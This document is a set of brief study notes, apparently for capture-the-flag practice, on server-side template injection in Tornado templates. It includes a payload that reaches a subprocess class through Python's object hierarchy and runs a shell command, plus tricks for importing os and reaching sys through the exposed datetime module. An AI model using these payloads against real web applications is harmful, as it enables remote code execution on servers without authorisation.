- ```python
  {{handler.settings}}
  {{eval('[].__class__.__mro__[1].__subclasses__()[231]("ls",shell=1,stdout=-1).communicate()')}}
  ```
- `{%raw 114%}`输出表达式
- `{%import os%}`
- `request.arguments`POST（也许也有GET？）参数的字典，但是值是一堆bytes
- `request.files`上传文件的字典
- `request.headers`里面可以拿到^^字符串形式的Headers^^
- `extends`渲染另一个模板
- `datetime.sys.base_exec_prefix`是一个字符串
- `datetime.sys.builtin_module_names`有一堆字符串
- 命名空间里有datetime模块,也就是说可以拿到sys模块`datetime.sys`
	- ```python
	  namespace = {
	    "escape": escape.xhtml_escape,
	    "xhtml_escape": escape.xhtml_escape,
	    "url_escape": escape.url_escape,
	    "json_encode": escape.json_encode,
	    "squeeze": escape.squeeze,
	    "linkify": escape.linkify,
	    "datetime": datetime,
	    "_tt_utf8": escape.utf8,  # for internal use
	    "_tt_string_types": (unicode_type, bytes),
	    # __name__ and __loader__ allow the traceback mechanism to find
	    # the generated source code.
	    "__name__": self.name.replace(".", "_"),
	    "__loader__": ObjectDict(get_source=lambda name: self.code),
	  }
	  ```
- 利用列表从一个字典中取出所有的值
	- ```
	  {%set x=[]%}
	  {%for k in {114:514}%}
	  {%apply x.append%}{%raw {114:1}[k]%}{%end%}
	  {%raw print(x)%}
	  {%end%}
	  ```
	- ```
	  {%set x=[]%}
	  {%set d={114:514}%}
	  {%set g=iter(d)%}
	  {%try%}
	  {%while 1%}
	  {%apply x.append%}{%raw next(g)%}{%end%}
	  {%end%}
	  {%except%}
	  {%end%}
	  {%raw print(x)%}
	  ```